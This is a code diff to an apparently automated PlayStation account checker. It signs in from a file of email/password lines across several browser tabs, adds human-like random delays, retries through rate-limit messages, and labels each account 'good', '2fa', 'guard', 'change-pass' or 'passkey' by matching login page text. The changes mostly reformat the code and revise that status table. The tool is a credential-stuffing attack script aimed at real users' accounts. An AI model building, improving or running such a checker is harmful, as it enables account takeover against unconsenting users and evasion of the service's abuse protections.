@@ -24,7 +24,7 @@ export default class AccountProcessor {
 
             // ✅ اصلاح: استفاده از page به جای ret
             page = await this._createAndLoadPage(context, tabIndex, email);
-            
+
             let timeoutRetryCount = 0;
             let finalResult = null;
 
@@ -37,16 +37,16 @@ export default class AccountProcessor {
                     }
 
                     finalResult = await this._processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount);
-                    
+
                     if (finalResult.shouldExit) {
                         return finalResult.result;
                     }
-                    
+
                     if (finalResult) break;
 
                 } catch (retryErr) {
                     logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);
-                    
+
                     timeoutRetryCount++;
                     if (timeoutRetryCount > Constants.MAX_TIMEOUT_RETRIES) {
                         finalResult = {
@@ -76,8 +76,8 @@ export default class AccountProcessor {
         } finally {
             // ✅ اصلاح: اطمینان از بسته شدن صحیح صفحه
             if (page && !page.isClosed()) {
-                try { 
-                    await page.close(); 
+                try {
+                    await page.close();
                     logger.debug(`📄 Tab ${tabIndex + 1}: Page closed successfully`);
                 } catch (closeErr) {
                     logger.warn(`⚠️ Tab ${tabIndex + 1}: Error closing page: ${closeErr.message}`);
@@ -88,14 +88,14 @@ export default class AccountProcessor {
 
     async _createAndLoadPage(context, tabIndex, email) {
         let page = null;
-        
+
         for (let attempt = 1; attempt <= Constants.MAX_RETRIES; attempt++) {
             try {
                 await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));
-                
+
                 // ✅ اصلاح: ایجاد صفحه جدید با مدیریت بهتر خطا
                 page = await context.newPage();
-                
+
                 // ✅ اصلاح: تنظیم viewport با استفاده از page به جای ret
                 await page.setViewportSize({
                     width: 1200 + (tabIndex * 50),
@@ -124,8 +124,8 @@ export default class AccountProcessor {
 
                 // ✅ اصلاح: بستن صفحه ناموفق
                 if (page && !page.isClosed()) {
-                    try { 
-                        await page.close(); 
+                    try {
+                        await page.close();
                     } catch { }
                     page = null;
                 }
@@ -188,7 +188,7 @@ export default class AccountProcessor {
         }
 
         logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
-        
+
         const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 20000);
         const emailInput = PageHelpers.emailLocator(emailFrame);
 
@@ -226,10 +226,22 @@ export default class AccountProcessor {
             bodyText = await page.evaluate(() => document.body?.innerText || "");
         }
 
-        if ((bodyText.includes(`Can't connect to the server`) || bodyText.includes('device sent too many requests')) && accountsCount === tabIndex + 1) {
+        if (await PageHelpers._hasTimeoutMessage(bodyText) && accountsCount === tabIndex + 1) {
             logger.warn(`⏰ Tab ${tabIndex + 1}: Timeout detected for ${email}`);
-            
+
             if (timeoutRetryCount >= Constants.MAX_TIMEOUT_RETRIES) {
+                console.log({
+                    shouldExit: true,
+                    result: {
+                        email,
+                        status: 'timeout-error',
+                        responseTime: Date.now() - startTime,
+                        tabIndex,
+                        retryCount: timeoutRetryCount,
+                        message: 'Max timeout retries exceeded'
+                    }
+                });
+
                 return {
                     shouldExit: true,
                     result: {
@@ -288,16 +300,19 @@ export default class AccountProcessor {
 
     _determineLoginStatus(bodyText) {
         const statusChecks = [
-            { text: 'This sign-in ID has been disabled', status: 'disabled' },
-            { text: 'Please enter a correct sign-in ID', status: 'invalid-email' },
-            { text: 'Please enter the correct password', status: 'invalid-password' },
             { text: 'Sign in to PlayStation', status: 'login-page' },
-            { text: 'Account Management', status: 'success' },
-            { text: 'Privacy Settings', status: 'success' },
-            { text: 'Sign In with Passkey', status: 'passkey' },
+            { text: 'A verification code has been sent to your', status: 'good' },
             { text: 'Two-factor authentication', status: '2fa' },
             { text: 'verification code', status: '2fa' },
-            { text: 'Enter the verification code', status: '2fa' }
+            { text: 'Enter the verification code', status: '2fa' },
+            { text: 'Sign In with Passkey', status: 'passkey' },
+            { text: `Your account has been locked.`, status: 'guard' },
+            { text: `To sign in, you'll need to recover your account`, status: 'guard' },
+            { text: `The sign-in ID (email address) or password you entered isn't correct`, status: 'change-pass' },
+            { text: `or you might need to reset your password for security reasons.`, status: 'change-pass' },
+            { text: `2-step verification is enabled`, status: 'mobile-2step' },
+            { text: `Check your mobile phone for a text message with a verification code`, status: 'mobile-2step' },
+            { text: `Can't connect to the server`, status: 'server-error' }
         ];
 
         for (const check of statusChecks) {
@@ -404,7 +419,7 @@ export default class AccountProcessor {
 
             const remainingAccounts = accounts.slice(count);
             const newContent = remainingAccounts.length > 0 ? remainingAccounts.join("\n") + "\n" : "";
-            
+
             await fs.writeFile(Constants.ACCOUNTS_FILE, newContent, "utf8");
             console.log(`✅ Removed ${count} processed accounts from file`);
         } catch (err) {
@@ -450,7 +465,7 @@ export default class AccountProcessor {
             'CONTEXT_DESTROYED'
         ];
 
-        return criticalErrors.some(criticalError => 
+        return criticalErrors.some(criticalError =>
             error.message && error.message.includes(criticalError)
         );
     }
